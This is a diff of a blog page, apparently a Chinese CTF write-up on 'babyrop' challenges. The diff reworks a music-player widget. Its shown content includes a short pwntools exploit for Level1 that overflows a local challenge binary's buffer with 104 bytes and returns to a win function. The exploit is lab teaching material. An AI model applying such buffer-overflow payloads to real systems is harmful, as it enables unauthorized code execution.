@@ -54,6 +54,9 @@
   
 
   <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+<link rel="stylesheet" href="/assets/css/APlayer.min.css" class="aplayer-style-marker">
+<script src="/assets/js/APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="/assets/js/Meting.min.js" class="meting-script-marker"></script>
 <link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <!--
@@ -217,7 +220,12 @@
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<p>写在前面：如果是普通的环境，运行程序可能需要<code>capstone</code>，可以直接在官网下载源码编译，然后将编译好的动态链接库cp到lib里</p>
+      		
+    <div id="aplayer-NkDACwlP" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"
+    ></div> 
+
+<p>写在前面：如果是普通的环境，运行程序可能需要<code>capstone</code>，可以直接在官网下载源码编译，然后将编译好的动态链接库cp到lib里</p>
 <p><code> cp libcapstone.so.5 /lib/x86_64-linux-gnu/</code></p>
 <h4 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h4><p>​        最最最基础的rop了，和前前一个module的前面的有个level一模一样。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyrop_level1.0&quot;</span>)</span><br><span class="line">win = <span class="number">0x401b56</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">104</span> + p64(win)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -829,12 +837,22 @@ $('#intro').find('img').each(function(){
 
       
       
-<!-- 加入APlayer音乐播放器 -->
+
+<!--
+
 <link rel="stylesheet" href="/dist/APlayer.min.css">
 <div id="aplayer"></div>
-<script type="text/javascript" src="/dist/APlayer.min.js"></script>
-<script type="text/javascript" src="/dist/music.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+-->
+<!-- require MetingJS 
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<meting-js
+      server="netease"
+      type="playlist"
+      id="4904272454">
+</meting-js>
+
+-->
 
 </body>
 
